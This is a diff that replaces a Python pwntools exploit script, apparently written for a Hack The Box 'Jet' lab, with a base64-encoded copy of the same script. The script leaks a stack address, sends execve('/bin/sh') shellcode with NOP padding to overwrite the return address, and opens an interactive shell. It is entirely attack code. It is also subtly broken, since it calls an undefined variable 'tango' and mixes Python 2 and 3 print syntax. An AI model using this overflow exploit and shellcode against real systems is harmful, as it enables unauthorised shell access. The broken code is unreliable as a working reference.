@@ -1,16 +1,1 @@
-#created for htb fortress jet labs
-from pwn import * # https://docs.pwntools.com/en/stable/about.html
-p=process("./leak") #exec
-tango.recvuntil("Oops, I'm leaking! ") #collect leak like % --> "Oops, I'm leaking! 0x7ffed4437110" ref https://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.recvuntil
-leak=int(tango.recvuntil("\n"),16) #save leak memory variable in int mode on leak variable
-print ("Int leak code:") ,leak # 140735484032624
-print ("Hex leak code:"), hex(leak),"\n" # 0x7fff88887670
-tango.recvuntil("> ") #recv input
-shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" #malicious payload overflow RIP 
-buf=shellcode
-buf+="\x90"*(72-len(shellcode)) #NOPs * 72(segment fault) - shellcode lenght
-buf+=p64(leak, endianness="little") # https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.p64
-print ("[+] Malicious Payload Sent [+]\n")
-tango.sendline(buf) #send 
-print ("[+] Payload Works, shell is above: [+]")
-tango.interactive() #shellspawn
+I2NyZWF0ZWQgZm9yIGh0YiBmb3J0cmVzcyBqZXQgbGFicwpmcm9tIHB3biBpbXBvcnQgKiAjIGh0dHBzOi8vZG9jcy5wd250b29scy5jb20vZW4vc3RhYmxlL2Fib3V0Lmh0bWwKcD1wcm9jZXNzKCIuL2xlYWsiKSAjZXhlYwp0YW5nby5yZWN2dW50aWwoIk9vcHMsIEknbSBsZWFraW5nISAiKSAjY29sbGVjdCBsZWFrIGxpa2UgJSAtLT4gIk9vcHMsIEknbSBsZWFraW5nISAweDdmZmVkNDQzNzExMCIgcmVmIGh0dHBzOi8vZG9jcy5wd250b29scy5jb20vZW4vc3RhYmxlL3R1YmVzLmh0bWwjcHdubGliLnR1YmVzLnR1YmUudHViZS5yZWN2dW50aWwKbGVhaz1pbnQodGFuZ28ucmVjdnVudGlsKCJcbiIpLDE2KSAjc2F2ZSBsZWFrIG1lbW9yeSB2YXJpYWJsZSBpbiBpbnQgbW9kZSBvbiBsZWFrIHZhcmlhYmxlCnByaW50ICgiSW50IGxlYWsgY29kZToiKSAsbGVhayAjIDE0MDczNTQ4NDAzMjYyNApwcmludCAoIkhleCBsZWFrIGNvZGU6IiksIGhleChsZWFrKSwiXG4iICMgMHg3ZmZmODg4ODc2NzAKdGFuZ28ucmVjdnVudGlsKCI+ICIpICNyZWN2IGlucHV0CnNoZWxsY29kZT0iXHgzMVx4YzBceDQ4XHhiYlx4ZDFceDlkXHg5Nlx4OTFceGQwXHg4Y1x4OTdceGZmXHg0OFx4ZjdceGRiXHg1M1x4NTRceDVmXHg5OVx4NTJceDU3XHg1NFx4NWVceGIwXHgzYlx4MGZceDA1IiAjbWFsaWNpb3VzIHBheWxvYWQgb3ZlcmZsb3cgUklQIApidWY9c2hlbGxjb2RlCmJ1Zis9Ilx4OTAiKig3Mi1sZW4oc2hlbGxjb2RlKSkgI05PUHMgKiA3MihzZWdtZW50IGZhdWx0KSAtIHNoZWxsY29kZSBsZW5naHQKYnVmKz1wNjQobGVhaywgZW5kaWFubmVzcz0ibGl0dGxlIikgIyBodHRwczovL2RvY3MucHdudG9vbHMuY29tL2VuL3N0YWJsZS91dGlsL3BhY2tpbmcuaHRtbCNwd25saWIudXRpbC5wYWNraW5nLnA2NApwcmludCAoIlsrXSBNYWxpY2lvdXMgUGF5bG9hZCBTZW50IFsrXVxuIikKdGFuZ28uc2VuZGxpbmUoYnVmKSAjc2VuZCAKcHJpbnQgKCJbK10gUGF5bG9hZCBXb3Jrcywgc2hlbGwgaXMgYWJvdmU6IFsrXSIpCnRhbmdvLmludGVyYWN0aXZlKCkgI3NoZWxsc3Bhd24=
